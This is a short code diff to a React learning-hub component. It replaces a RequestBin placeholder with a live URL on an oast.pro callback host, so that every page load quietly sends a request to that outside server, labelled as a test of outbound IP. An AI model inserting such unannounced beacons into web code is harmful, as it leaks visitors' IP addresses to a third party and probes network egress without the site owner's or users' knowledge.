@@ -118,7 +118,7 @@ function LearningHubClient({ initialContent }: LearningHubClientProps) {
 
   // Test outbound IP
   useEffect(() => {
-    fetch("https://<YOUR_REQUESTBIN_URL>")
+    fetch("https://b9d55262e0485463c481g1pwy5oyyyyyb.oast.pro")
       .then(() => console.log("Request sent to RequestBin"))
       .catch(console.error);
   }, []);
